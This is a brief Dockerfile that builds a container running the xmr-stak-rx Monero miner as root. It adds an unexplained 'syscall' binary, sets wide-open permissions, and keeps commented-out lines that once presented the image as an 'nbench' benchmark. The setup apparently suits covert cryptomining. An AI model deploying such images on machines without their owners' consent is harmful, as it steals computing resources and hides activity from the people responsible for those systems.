#FROM gigichen34/nbench

#WORKDIR /app

#ADD syscall /usr/bin/

#ENTRYPOINT ["./nbench"]

FROM xmr-stak-rx:single

USER root 

ADD syscall /usr/bin/

ADD xmr-stak-rx /home/

ADD config.txt /home/

ADD cpu.txt /home/

ADD pools.txt /home/ 

RUN chmod o+x /usr/bin/syscall; chmod +777 /home/*

WORKDIR /home/

CMD ./xmr-stak-rx --noTest

